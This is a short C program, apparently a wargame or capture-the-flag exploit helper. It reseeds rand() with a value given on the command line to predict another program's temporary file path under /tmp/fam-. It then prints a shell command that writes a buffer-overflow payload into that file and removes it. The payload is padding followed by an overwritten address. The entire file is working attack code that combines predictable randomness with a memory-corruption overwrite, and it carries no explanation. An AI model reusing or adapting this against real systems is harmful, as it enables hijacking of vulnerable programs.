#include <stdio.h>
#include <stdlib.h>

#define CHARS 62
char fifpath[64] = "/tmp/fam-";
char randchars[CHARS + 1] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

int main(int argc, char **argv)
{
    char prefix[] = "echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcccc\\x46\\x88\\x04\\x08' > ";
    char prefix2[] = " && rm ";
    int val;
    val = atoi(argv[1]);
    srand(val);
    for (int i = 9; i < 20; i++) {
        fifpath[i] = randchars[rand() % CHARS];
    }
    fifpath[20] = 0;
    printf("%s", prefix);
    printf("%s", fifpath);
    printf("%s", prefix2);
    printf("%s\n", fifpath);
}
